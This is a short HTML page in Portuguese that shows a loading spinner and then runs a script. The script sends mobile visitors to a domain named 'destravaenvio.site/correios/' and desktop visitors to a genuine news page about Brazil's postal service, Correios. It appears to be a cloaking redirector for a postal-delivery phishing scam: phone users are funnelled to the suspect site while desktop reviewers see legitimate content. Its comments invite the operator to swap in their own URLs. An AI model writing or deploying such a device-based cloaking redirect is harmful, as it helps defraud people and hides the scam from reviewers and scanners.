<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: white;
            font-family: Arial, sans-serif;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="spinner"></div>

    <script>
        // ========== CONFIGURAÇÕES - ALTERE AQUI ==========
        const SITE_MOBILE = 'https://destravaenvio.site/correios/'; // PARA MOBILE
        const SITE_DESKTOP = 'https://g1.globo.com/tudo-sobre/correios/'; // PARA DESKTOP
        // ================================================

        // Detectar se é Mobile
        function isMobile() {
            const userAgent = navigator.userAgent;
            
            // Lista de palavras-chave para mobile
            const mobileKeywords = [
                'Android', 'iPhone', 'iPad', 'iPod', 'BlackBerry', 
                'Windows Phone', 'Mobile', 'webOS'
            ];
            
            // Verifica se alguma palavra-chave está no user agent
            for (let i = 0; i < mobileKeywords.length; i++) {
                if (userAgent.indexOf(mobileKeywords[i]) !== -1) {
                    return true;
                }
            }
            
            // Verifica também o tamanho da tela
            if (window.innerWidth <= 768) {
                return true;
            }
            
            return false;
        }

        // Função de Redirecionamento
        function redirect() {
            const mobile = isMobile();
            
            console.log('É Mobile?', mobile);
            console.log('User Agent:', navigator.userAgent);
            console.log('Largura da tela:', window.innerWidth);
            
            if (mobile) {
                // Se for MOBILE = vai para site original
                console.log('Redirecionando para:', SITE_MOBILE);
                window.location.replace(SITE_MOBILE);
            } else {
                // Se for DESKTOP = vai para site alternativo
                console.log('Redirecionando para:', SITE_DESKTOP);
                window.location.replace(SITE_DESKTOP);
            }
        }

        // Aguarda um pouco e redireciona
        setTimeout(redirect, 500);
    </script>
</body>
</html>
